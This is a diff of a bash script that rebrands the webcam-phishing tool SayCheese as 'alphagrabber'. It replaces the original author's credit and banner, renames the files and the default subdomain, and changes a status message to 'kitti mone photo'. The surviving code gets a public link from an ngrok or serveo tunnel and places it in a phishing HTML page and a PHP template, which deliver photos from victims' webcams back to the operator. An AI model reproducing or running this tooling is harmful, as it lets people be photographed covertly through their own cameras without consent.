@@ -1,21 +1,25 @@
 #!/bin/bash
-# SayCheese v1.0
-# coded by: github.com/thelinuxchoice/saycheese
-# If you use any part from this code, giving me the credits. Read the Lincense!
+# alphagrabber v1.0
+# coded by: https://github.com/ITZMEALPHA
+# If you use any part from this code, giving me the credits.
 
 trap 'printf "\n";stop' 2
 
 banner() {
 
 
-printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
-printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "\e[1;92m              |___/ \e[0m                                 \n"
+printf "\e[1;92m    
+▄▀█ █░░ █▀█ █░█ ▄▀█
+█▀█ █▄▄ █▀▀ █▀█ █▀█                \e[0m\e[1;77m                               \e[0m\n"
+printf "\e[1;92m                    \e[0m\e[1;77m/     
+█▀▀ █▀█ ▄▀█ █▄▄ █▄▄ █▀▀ █▀█
+█▄█ █▀▄ █▀█ █▄█ █▄█ ██▄ █▀▄                          \e[0m\n"
+printf "\e[1;92m                    \e[0m\e[1;77m/                               \ \e[0m\n"
+printf "\e[1;92m                   |\e[0m\e[1;77m                                 \e[0m\n"
+printf "\e[1;92m                    |\e[0\e[1;77m                                \e[0m\n"
+printf "\e[1;92m                   \e[0m                                 \n"
 
-printf " \e[1;77m v1.0 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+printf " \e[1;77m v1.0 coded by https://github.com/ITZMEALPHA\e[0m \n"
 
 printf "\n"
 
@@ -79,7 +83,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] kitti mone photo!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
@@ -122,7 +126,7 @@ printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $s
 payload_ngrok() {
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$link'+g' alphagrabber.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
@@ -210,7 +214,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' alphagrabber.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
@@ -219,7 +223,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="saycheese$RANDOM"
+default_subdomain="alphagrabber$RANDOM"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
